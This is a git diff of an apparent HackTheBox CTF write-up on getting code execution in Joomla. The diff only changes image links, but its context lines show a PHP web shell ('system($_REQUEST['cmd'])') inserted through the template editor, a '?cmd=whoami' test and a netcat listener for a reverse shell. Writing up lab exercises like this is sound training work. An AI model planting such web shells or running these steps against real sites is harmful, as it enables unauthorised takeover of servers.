@@ -4,7 +4,7 @@ categories: [Abusing CMSs]
 tags: [hackthebox, pentesting]
 ---
 
-<img src="../images/joomla-removebg-preview.png" height="130" width="180">
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-removebg-preview.png" height="130" width="180">
 
 - CTF of this post: **Enterprise** on *HackTheBox*.
 
@@ -15,7 +15,7 @@ If you want to enumerate a Joomla you can use **Joomscan**, a tool developed by 
 
 The way to execute commands it's really similar to the technique in Wordpress, however once you are logged in as admin or privileges you may be seeing something like this:
 
-<img src="../../images/joomla-dashboard.png">
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-dashboard.png">
 
 Now go to **"Extensions"** --> **"Templates"** --> **"Templates"**
 
@@ -27,7 +27,7 @@ system($_REQUEST['cmd']);
 ```
 
 And click on **"Save"**
-<img src="../../images/joomla-editor.png">
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-editor.png">
 
 At this point, if you go to the index.php or to the edited php file you can add *"?cmd=whoami"* for checking the RCE.
 
@@ -54,10 +54,10 @@ So before you make the request:
 nc -nlvp 443
 ```
 
-<img src="../../images/joomla-rce.png">
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-rce.png">
 
 And if all works good you should receive a interactive session.
 
-<img src="../../images/joomla-shell.png">
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/joomla-shell.png">
 
 And thats's all
